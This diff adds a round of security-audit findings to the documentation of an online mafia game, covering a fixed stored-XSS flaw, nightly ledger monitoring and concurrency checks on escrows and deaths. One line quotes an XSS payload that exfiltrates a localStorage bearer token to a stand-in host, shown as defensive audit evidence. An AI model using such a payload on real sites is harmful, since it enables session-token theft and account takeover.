@@ -290,3 +290,56 @@ ordering, idempotency-retry seams, and display drift — never a value-minting o
 backed-$OMR flywheel, escrow identities, chain reserve, loot legs, auth boundary, and lock order are the
 load-bearing surfaces and all verified sound. Residuals are LOW / deploy-config / founder-sign-off, tracked
 above and in BALANCE.md.
+
+## Round 6 — four safety-critical lenses (death/PvP concurrency, competitive escrows, worker orchestration, client/public-route injection) + a manual estate-wipe completeness sweep
+
+**Verdict: 1 HIGH (stored XSS) + 2 MED (worker monitoring) fixed. The death/PvP chain, all competitive
+escrows, and the estate wipe verified sound.** This round surfaced the loop's most serious finding.
+
+### Fixed
+- **Stored XSS → account takeover (HIGH).** Player display strings (character/gang name, custom title,
+  140-char contract reason, estate name) had NO server-side charset filter, the console renders them raw
+  into innerHTML (no escape helper — `esc` was undefined), and the bearer token lives in localStorage. A
+  name/reason like `<img onerror=fetch('//e/'+localStorage.omerta_token)>` executes when a victim views
+  the contract board / streets roster → token exfiltration → cross-user account theft. Fixed at the DATA
+  LAYER (shared `cleanText()` strips `< > " ` + control chars from all six write sites; legit punctuation
+  survives) + client-side `esc()` defense-in-depth (also fixes a pre-existing broken `esc()` reference
+  that threw). Fighter/racer/speakeasy/dynasty names already used the safe `/^[\w .,'&-]+$/` charset. The
+  broadcast/public cards.js was already clean. Regression in test/security.js.
+- **Worker A — real-value invariants now alarm nightly (MED→HIGH on chain go-live).** The nightly monitor
+  ran only `runLedgerInvariants`; the Vig (extraction≤reserve, reserve-backed) + Bond (anti-Ponzi) walls
+  were mod-route-only and self-alerted nowhere → a live unbacked reserve would drift SILENTLY. Now run
+  nightly + routed through the same `alertDrift` (kind-tagged; ledger keeps its original event name).
+- **Worker B — the ledger monitor is now a consistent snapshot (MED).** ~40 independent reads had no
+  snapshot, so a player commit between two halves of a check tore the read into FALSE drift → a false
+  webhook alarm at the non-technical founder. Now wrapped in one REPEATABLE READ / READ ONLY transaction
+  (clean pg-mem fallback). No check logic changed.
+
+### Verified CLEAN (not patched)
+- **Death/PvP concurrency (a519):** no CRIT/HIGH/MED — the victim `FOR UPDATE alive` load + in-memory
+  `alive=false` persist-skip (no cash resurrection), account-lock-serialized shield/loot ordering
+  (bodyguard→respawn, one absorb), all-pots-pre-locked bounty-on-death, `killerCh` in-memory loot
+  threading, single-`WHERE id IN` war-score (no AB-BA), and fresh-heir state all hold under adversarial
+  interleaving. One benign LOW (a `bodyguardAbsorbs` guard-death TOCTOU — a just-killed guard absorbs the
+  bullet in a sub-ms window; no §10.4, no resurrection, defender-favoring) — flagged.
+- **Competitive escrows (a4b5):** no CRIT/HIGH — every escrow identity (boxing main-event / poker tourney
+  / grand-prix / stakes / futurity) drains to 0 on every terminal state; the parimutuels never touch the
+  PvE den book (reason-prefix isolation); state-before-row lock order consistent; worker resolvers
+  idempotent single-writers; the two-party instant games are the audited casino:pvp taxed transfer;
+  belt/callout/legend under death sound; frozen-form snapshots resolve even if the racer is bred/sold.
+  Two LOW (retry-masked boxing resolve-vs-cancel AB-BA; standover forfeits the owner's pending bar take)
+  — flagged.
+- **Worker orchestration (a1c2):** buyback conservation exact + lock order + idempotency, season rollover
+  snapshot-before-reset + under-winner-lock grant + idempotent, `safe()` per-job isolation, assertChainId
+  fail-closed, reclaim no-double-spend — all sound. Two LOW flagged (no `statement_timeout`; season
+  rollover is one monolithic txn — liveness, not §10.4).
+- **Estate-wipe completeness (manual):** every character-keyed table is wiped (loop + direct DELETEs +
+  dedicated `wipeFighterAtDeath`/`wipeSpeakeasyAtDeath`/`cancelMainEventsAtDeath`/convoys-`lost`), an
+  intentional account survivor (`account_persistent`/`rng_audit`/`transactions`), or an intentional
+  resolve-snapshot (`*_entries`/`futurity_runners`/`track_entries`). The two un-wiped (`notifications`,
+  `missions_done`) are harmless cruft — never re-read (fresh heir id) and the reward is account-gated. No
+  orphan/inheritance bug.
+- **Route-wrapper discipline (manual):** no player economic route bypasses withCharacter/withTwoCharacters.
+
+**Round 6 verdict: 3 fixes (1 HIGH XSS + 2 MED monitoring). The death/PvP + escrow + estate cores are
+sound. Residual LOWs are benign/design/deploy-config. Suite green + sim drift-0.**
